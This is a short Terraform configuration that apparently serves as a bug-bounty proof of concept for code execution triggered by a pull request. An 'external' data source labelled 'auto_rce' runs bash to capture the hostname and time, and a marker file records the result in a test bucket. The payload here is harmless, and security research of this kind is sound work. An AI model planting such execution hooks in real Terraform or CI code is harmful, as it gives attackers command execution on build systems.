terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "auto_rce" {
  program = ["bash", "-c", "echo '{\"proof\": \"REAL_GITHUB_PR_AUTO_TRIGGER\", \"time\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\", \"host\": \"'$(hostname)'\"}'"]
}

resource "google_storage_bucket_object" "marker" {
  name    = "im-pr-attack-test/auto-marker.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.auto_rce.result.proof
}

output "auto_proof" { value = data.external.auto_rce.result.proof }
